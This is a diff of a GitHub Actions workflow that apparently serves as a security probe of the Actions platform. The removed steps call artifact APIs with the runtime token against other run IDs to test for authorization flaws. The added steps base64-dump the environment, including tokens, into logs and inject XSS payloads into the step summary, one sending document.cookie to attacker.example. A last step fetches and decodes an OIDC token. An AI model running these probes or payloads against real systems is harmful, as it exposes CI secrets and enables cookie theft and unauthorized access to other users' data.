@@ -1,59 +1,71 @@
-name: RuntimeTokenProbe
+name: MultiProbe
 on:
   push:
     branches: [main]
 permissions:
   contents: read
   id-token: write
+  actions: write
 
 jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Extract runtime token
+      - name: Step 1 - env before any uses action
         run: |
-          echo "=ENV_B64_START="
+          echo "=ENV_BEFORE_B64="
           env | base64 -w0
           echo ""
-          echo "=ENV_B64_END="
-          echo "RUNTIME_URL=$ACTIONS_RUNTIME_URL"
-          echo "RUN_ID=$GITHUB_RUN_ID"
+          echo "=ENV_BEFORE_END="
 
-      - name: Twirp probe
+      - name: Create artifact file
+        run: echo "probe-$(date +%s)" > /tmp/probe.txt
+
+      - name: Upload artifact (triggers ACTIONS_RUNTIME_TOKEN)
+        uses: actions/upload-artifact@v4
+        with:
+          name: probe-artifact
+          path: /tmp/probe.txt
+
+      - name: Step 2 - env AFTER upload-artifact
         run: |
-          RT="$ACTIONS_RUNTIME_TOKEN"
-          RESULTS="https://results.actions.githubusercontent.com"
-          echo "=LIST_CURRENT="
-          curl -s -w "\nHTTP:%{http_code}" \
-            -X POST \
-            -H "Authorization: Bearer $RT" \
-            -H "Content-Type: application/json" \
-            -d "{\"workflowRunId\":\"$GITHUB_RUN_ID\"}" \
-            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts"
+          echo "=ENV_AFTER_B64="
+          env | base64 -w0
           echo ""
-          echo "=LIST_BOLA_1="
-          curl -s -w "\nHTTP:%{http_code}" \
-            -X POST \
-            -H "Authorization: Bearer $RT" \
-            -H "Content-Type: application/json" \
-            -d '{"workflowRunId":"1"}' \
-            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts"
-          echo ""
-          echo "=CREATE_FAKE_IDS="
-          curl -s -w "\nHTTP:%{http_code}" \
-            -X POST \
-            -H "Authorization: Bearer $RT" \
-            -H "Content-Type: application/json" \
-            -d '{"workflowRunBackendId":"00000000-0000-0000-0000-000000000001","workflowJobRunBackendId":"00000000-0000-0000-0000-000000000002","name":"bola-test","version":4}' \
-            "${RESULTS}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact"
-          echo ""
-          echo "=PIPELINES_API="
-          curl -s -w "\nHTTP:%{http_code}" \
-            -H "Authorization: Bearer $RT" \
-            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/${GITHUB_RUN_ID}/artifacts?api-version=6.0-preview"
-          echo ""
-          echo "=PIPELINES_BOLA_1="
-          curl -s -w "\nHTTP:%{http_code}" \
-            -H "Authorization: Bearer $RT" \
-            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/1/artifacts?api-version=6.0-preview"
-          echo ""
+          echo "=ENV_AFTER_END="
+          echo "RUNTIME_URL=$ACTIONS_RUNTIME_URL"
+          echo "RUNTIME_TOKEN_LEN=${#ACTIONS_RUNTIME_TOKEN}"
+
+      - name: Step summary HTML injection test
+        run: |
+          {
+            echo "# Test"
+            printf '<script>document.title="XSS_GITHUB_ACTIONS"</script>'
+            printf '\n'
+            printf '<img src=x onerror=alert(document.domain)>'
+            printf '\n'
+            printf '<svg onload=alert(1)><rect/></svg>'
+            printf '\n'
+            printf '<details open ontoggle=fetch("https://attacker.example/?" + document.cookie)><summary>!</summary></details>'
+            printf '\n'
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: OIDC claims for push trigger
+        run: |
+          T=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "
+import json,sys
+print(json.load(sys.stdin).get('value','ERR'))
+")
+          echo "$T" | cut -d. -f2 | python3 -c "
+import sys,base64,json
+p=sys.stdin.read().strip()
+p+='='*(-len(p)%4)
+d=json.loads(base64.b64decode(p))
+print('sub:', d.get('sub'))
+print('ref:', d.get('ref'))
+print('event_name:', d.get('event_name'))
+print('workflow_ref:', d.get('workflow_ref'))
+print('runner_env:', d.get('runner_environment'))
+"
